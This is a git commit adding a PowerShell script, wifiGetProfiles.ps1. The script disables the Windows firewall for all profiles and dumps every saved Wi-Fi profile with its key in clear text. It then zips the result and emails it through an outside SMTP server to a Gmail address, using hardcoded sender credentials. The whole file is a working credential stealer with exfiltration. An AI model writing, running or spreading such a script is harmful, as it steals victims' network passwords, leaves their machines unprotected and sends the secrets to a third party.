510274d6af5d06cfa76f4c596517bc122187db32
ioChelox <86814661+ioChelox@users.noreply.github.com>
2022-07-07 18:04:37 -0400

    Add files via upload

---
+++ wifiGetProfiles.ps1
@@ -0,0 +1,20 @@
+$folderAcc = "accountsInfo"
+mkdir $folderAcc
+
+netsh advfirewall set allprofiles state off
+
+$allProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}
+
+$allProfiles >> allProfiles.txt
+
+
+Compress-Archive -Path 'allProfiles.txt' -DestinationPath 'allProfiles.zip'
+
+try {
+    $Sender = 'ioinfinitum@vivaldi.net'
+    $Recipient = 'nine9brains@gmail.com'
+    $pass = ConvertTo-SecureString 'pwdVivaldi22./' -AsPlainText -Force
+    $creds = New-Object System.Management.Automation.PSCredential($sender.Split("@")[0], $pass)
+    Send-MailMessage -From $Sender -To $Recipient -Subject "Wifi Profiles" -Body "Attached you will find the zip file with profiles and passwords." -SmtpServer "smtp.vivaldi.net" -UseSSL -credential $creds -Attachments "allProfiles.zip"}
+catch {
+break }
